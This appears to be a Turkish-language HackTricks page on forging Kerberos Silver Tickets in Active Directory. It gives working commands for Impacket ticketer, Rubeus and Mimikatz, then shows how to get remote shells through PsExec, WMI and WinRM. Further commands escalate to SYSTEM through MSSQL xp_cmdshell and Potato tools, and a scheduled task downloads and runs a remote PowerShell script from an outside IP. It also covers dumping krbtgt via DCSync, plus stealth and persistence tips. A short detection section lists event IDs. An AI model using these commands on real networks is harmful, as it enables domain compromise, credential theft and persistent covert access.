# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** saldırısı, Active Directory (AD) ortamlarındaki service ticket'ların istismar edilmesini içerir. Bu yöntem, Ticket Granting Service (TGS) ticket'ı forge etmek için bilgisayar hesabı gibi bir **service account'un NTLM hash'ini elde etmeye** dayanır. Saldırgan, bu forge edilmiş ticket ile ağdaki belirli service'lere erişebilir ve **herhangi bir kullanıcıyı taklit edebilir**; genellikle amaç administrative privilege elde etmektir. Ticket forge etmek için AES key'leri kullanmanın daha güvenli ve daha az tespit edilebilir olduğu vurgulanır.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticket'lar, krbtgt hesabı yerine yalnızca **service account'un hash'ini** gerektirdikleri için Golden Ticket'lara kıyasla daha az tespit edilebilir. Ancak hedefledikleri belirli service ile sınırlıdırlar. Ayrıca, yalnızca bir kullanıcının parolasını çalmak.
Dahası, **SPN'ye sahip bir account'un parolasını ele geçirirseniz**, bu parolayı kullanarak o service'e herhangi bir kullanıcıyı taklit eden bir Silver Ticket oluşturabilirsiniz.

### Modern Kerberos değişiklikleri (yalnızca AES kullanan domain'ler)

- **8 Kasım 2022'den itibaren (KB5021131)** Windows güncellemeleri, mümkün olduğunda service ticket'lar için varsayılan olarak **AES session key'leri** kullanır ve RC4'ü aşamalı olarak kaldırmaktadır. DC'lerin, 2026 ortasına kadar RC4 **varsayılan olarak devre dışı** şekilde sunulması beklenmektedir; bu nedenle silver ticket'lar için NTLM/RC4 hash'lerine güvenmek giderek daha sık `KRB_AP_ERR_MODIFIED` hatasıyla sonuçlanır. Hedef service account için her zaman **AES key'lerini** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) extract edin.<sup>[[5]](#references)</sup>
- Service account'un `msDS-SupportedEncryptionTypes` değeri AES ile sınırlandırılmışsa `/aes256` veya `-aesKey` kullanarak forge etmelisiniz; NTLM hash'ine sahip olsanız bile RC4 (`/rc4` veya `-nthash`) çalışmaz.<sup>[[6]](#references)</sup>
- gMSA/computer account'ları her 30 günde bir rotate olur; forge etmeden önce **mevcut AES key'ini** LSASS, Secretsdump/NTDS veya DCsync üzerinden dump edin.
- OPSEC: tool'larda varsayılan ticket lifetime çoğu zaman **10 yıldır**; anormal lifetime'lar nedeniyle tespit edilmekten kaçınmak için gerçekçi süreler (ör. dakika cinsinden `-duration 600`) ayarlayın.<sup>[[6]](#references)</sup>

Ticket crafting için işletim sistemine göre farklı tool'lar kullanılır:

### Linux'ta
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows'ta
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servisi, kurbanın dosya sistemine erişim için yaygın bir hedef olarak öne çıkarılır; ancak HOST ve RPCSS gibi diğer servisler de görevler ve WMI sorguları için istismar edilebilir.

### Örnek: MSSQL servisi (MSSQLSvc) + Potato ile SYSTEM

Bir SQL servis hesabının (ör. sqlsvc) NTLM hash'ine (veya AES anahtarına) sahipseniz, MSSQL SPN'i için bir TGS forge edebilir ve SQL servisine herhangi bir kullanıcıyı impersonate edebilirsiniz. Buradan, SQL servis hesabı olarak komut yürütmek için xp_cmdshell'i etkinleştirin. Bu token SeImpersonatePrivilege içeriyorsa, SYSTEM'e yükselmek için bir Potato zincirleyin.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Ortaya çıkan bağlamda SeImpersonatePrivilege varsa (hizmet hesaplarında genellikle bulunur), SYSTEM elde etmek için bir Potato varyantı kullanın:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL'yi kötüye kullanma ve xp_cmdshell'i etkinleştirme hakkında daha fazla ayrıntı:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato tekniklerine genel bakış:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Kullanılabilir Servisler

| Servis Türü                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak ayrıca:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda yalnızca şunu isteyebilirsiniz: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, ayrıca psexec            | CIFS                                                                       |
| LDAP operations, DCSync dahil           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** kullanarak bu ticket'ların **tümünü** aşağıdaki parametreyle isteyebilirsiniz:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **Aynı client/service için DC üzerinde öncesinde 4768/4769 bulunmaması**, doğrudan servise sunulan sahte bir TGS'nin yaygın bir göstergesidir.
- Anormal derecede uzun ticket ömrü veya beklenmeyen encryption type (domain AES zorluyorken RC4 kullanılması) da 4769/4624 verilerinde dikkat çeker.

## Persistence

Makinelerin parolalarını her 30 günde bir değiştirmesini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ayarını yapın veya makinelerin parolasının değiştirilmesi gereken rotation period'u belirtmek üzere `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30 günden daha büyük bir değere ayarlayabilirsiniz.<sup>[[3]](#references)</sup>

## Service tickets'ı Kötüye Kullanma

Aşağıdaki örneklerde ticket'ın administrator account taklit edilerek alındığını varsayalım.

### CIFS

Bu ticket ile **SMB** üzerinden `C$` ve `ADMIN$` klasörlerine (paylaşıma açıksa) erişebilir ve yalnızca aşağıdakine benzer bir işlem yaparak uzak filesystem'ın bir bölümüne dosya kopyalayabilirsiniz:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca **psexec** kullanarak host içinde bir shell elde edebilir veya arbitrary komutlar çalıştırabilirsiniz:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Bu izinle uzak bilgisayarlarda scheduled task'ler oluşturabilir ve arbitrary komutlar çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu ticket'larla **victim system üzerinde WMI çalıştırabilirsiniz**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
**wmiexec hakkında daha fazla bilgiyi** aşağıdaki sayfada bulabilirsiniz:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Bir bilgisayara winrm erişiminiz varsa **ona erişebilir** ve hatta bir PowerShell alabilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
**winrm kullanarak uzak bir hosta bağlanmanın daha fazla yolunu** öğrenmek için aşağıdaki sayfaya bakın:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Uzak bilgisayara erişmek için **winrm etkin ve dinliyor durumda olmalıdır**.

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dump edebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync hakkında daha fazla bilgi edinin**:


{{#ref}}
dcsync.md
{{#endref}}


## Referanslar

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): How to attack Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
